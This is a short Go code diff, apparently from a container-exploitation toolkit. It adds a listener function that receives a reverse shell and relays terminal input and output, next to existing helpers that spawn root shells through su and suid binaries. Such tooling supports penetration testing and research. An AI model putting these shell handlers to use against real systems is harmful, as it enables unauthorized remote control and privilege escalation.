@@ -1,11 +1,14 @@
 package internal
 
 import (
-	"github.com/ssst0n3/awesome_libs/awesome_error"
 	"io"
+	"net"
 	"os"
 	"os/exec"
 	"syscall"
+
+	"github.com/ctrsploit/sploit-spec/pkg/log"
+	"github.com/ssst0n3/awesome_libs/awesome_error"
 )
 
 func InvokeRootShellBySu() {
@@ -49,5 +52,20 @@ func InvokeRootShellBySuid(i io.Reader, o, e io.Writer) (err error) {
 		awesome_error.CheckErr(err)
 		return
 	}
+	return
+}
+
+func ReceiveReverseShell(listener net.Listener) (err error) {
+	conn, err := listener.Accept()
+	if err != nil {
+		awesome_error.CheckErr(err)
+		return
+	}
+	defer conn.Close()
+	log.Logger.Infof("received connection from %s", conn.RemoteAddr()) // Connection received
+	go func() {
+		io.Copy(os.Stdout, conn)
+	}()
+	io.Copy(conn, os.Stdin)
 	return
 }
